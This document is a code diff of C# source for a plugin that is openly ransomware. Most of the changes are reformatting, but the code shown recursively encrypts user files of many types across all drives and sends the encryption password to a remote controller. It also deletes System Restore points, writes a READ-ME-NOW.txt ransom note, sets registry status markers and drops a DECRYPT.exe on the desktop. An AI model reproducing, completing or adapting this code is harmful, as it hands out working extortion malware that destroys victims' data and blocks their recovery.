@@ -1,31 +1,28 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Reflection;
+using System.Management;
 using System.Runtime.InteropServices;
-using System.Threading;
-using MessagePackLib.MessagePack;
-using System.Drawing;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
+using MessagePackLib.MessagePack;
 using Microsoft.VisualBasic.CompilerServices;
 using Microsoft.Win32;
-using System.Management;
 using Plugin.Properties;
 
 namespace Plugin.Handler
 {
     public class HandleEncrypt
     {
+        private readonly object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
+        public StringBuilder Logs = new StringBuilder();
+        public object Mynote;
         public string password;
 
         [DllImport("user32")]
         private static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);
-        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
-        public object Mynote;
-        public StringBuilder Logs = new StringBuilder();
 
         public void BeforeAttack()
         {
@@ -71,9 +68,11 @@ namespace Plugin.Handler
 
         private void EncryptFile(string file, string password)
         {
-            try 
+            try
             {
-                if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
+                if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath &&
+                    file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment
+                        .GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
                 {
                     var bytesToBeEncrypted = File.ReadAllBytes(file);
                     var passwordBytes = Encoding.UTF8.GetBytes(password);
@@ -92,25 +91,25 @@ namespace Plugin.Handler
 
         private void encryptDirectory(string location, string password)
         {
-
-            try 
+            try
             {
-                string validExtensions = string.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent");
+                var validExtensions = string.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc",
+                    ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py",
+                    ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll",
+                    ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp",
+                    ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh",
+                    ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico",
+                    ".pas", ".db", ".torrent");
                 var files = Directory.GetFiles(location);
                 var childDirectories = Directory.GetDirectories(location);
                 for (int i = 0, loopTo = files.Length - 1; i <= loopTo; i++)
                 {
-                    string extension = Path.GetExtension(files[i]);
-                    if (validExtensions.Contains(extension.ToLower()))
-                    {
-                        EncryptFile(files[i], password);
-                    }
+                    var extension = Path.GetExtension(files[i]);
+                    if (validExtensions.Contains(extension.ToLower())) EncryptFile(files[i], password);
                 }
 
                 for (int i = 0, loopTo1 = childDirectories.Length - 1; i <= loopTo1; i++)
-                {
                     encryptDirectory(childDirectories[i], password);
-                }
             }
             catch (Exception ex)
             {
@@ -126,7 +125,8 @@ namespace Plugin.Handler
                 Connection.Send(Password(password));
                 Packet.Log(Connection.Hwid + "Encrypting...");
                 Thread.Sleep(1000);
-                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Encryption in progress...");
+                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status",
+                    "Encryption in progress...");
                 System_Driver(password);
                 Fix_Drivers(password);
                 Drivers(password);
@@ -135,14 +135,12 @@ namespace Plugin.Handler
                 SetMessage();
                 DeleteRestorePoints();
                 DropDecryptor();
-                Packet.Log(Connection.Hwid+ "Encrypted");
+                Packet.Log(Connection.Hwid + "Encrypted");
             }
             catch (Exception ex)
             {
                 Packet.Error(ex.Message);
             }
-
-            return;
         }
 
         private void System_Driver(string password)
@@ -157,7 +155,7 @@ namespace Plugin.Handler
                 var Driver = new DriveInfo(drive);
                 if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     encryptDirectory(DriverPath, password);
                 }
             }
@@ -170,7 +168,7 @@ namespace Plugin.Handler
                 var Driver = new DriveInfo(drive);
                 if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                 {
-                    string DriverPath = drive;
+                    var DriverPath = drive;
                     encryptDirectory(DriverPath, password);
                 }
             }
@@ -180,10 +178,13 @@ namespace Plugin.Handler
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                string fullpath = path + @"\READ-ME-NOW.txt";
-                string Message = Conversions.ToString(Mynote + Environment.NewLine + "Your ID is [" + (Connection.Hwid + "]"));
-                File.WriteAllText(fullpath, Message + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString());
+                var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                var fullpath = path + @"\READ-ME-NOW.txt";
+                var Message =
+                    Conversions.ToString(Mynote + Environment.NewLine + "Your ID is [" + Connection.Hwid + "]");
+                File.WriteAllText(fullpath,
+                    Message + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine +
+                    Logs);
                 Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-MSG", Message);
                 Process.Start(fullpath);
             }
@@ -192,7 +193,7 @@ namespace Plugin.Handler
                 Packet.Error(ex.Message);
             }
         }
-                        
+
         [DllImport("Srclient.dll")]
         public static extern int SRRemoveRestorePoint(int index);
 
@@ -200,8 +201,8 @@ namespace Plugin.Handler
         {
             try
             {
-                var objClass = new ManagementClass(@"\\.\root\default", "systemrestore", new System.Management.ObjectGetOptions());
-                ManagementObjectCollection objCol = objClass.GetInstances();
+                var objClass = new ManagementClass(@"\\.\root\default", "systemrestore", new ObjectGetOptions());
+                var objCol = objClass.GetInstances();
                 foreach (ManagementObject objItem in objCol)
                     SRRemoveRestorePoint(int.Parse(objItem["sequencenumber"].ToString()));
             }
@@ -210,12 +211,12 @@ namespace Plugin.Handler
                 Packet.Error(ex.Message);
             }
         }
-        
+
         private void DropDecryptor()
         {
             try
             {
-                string D = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe");
+                var D = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe");
                 File.WriteAllBytes(D, Resources.Decrypter);
                 Process.Start(D);
             }
@@ -224,9 +225,10 @@ namespace Plugin.Handler
                 Packet.Error(ex.Message);
             }
         }
+
         public static byte[] Password(string password)
         {
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "Password";
             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
             msgpack.ForcePathObject("Password").AsString = password;
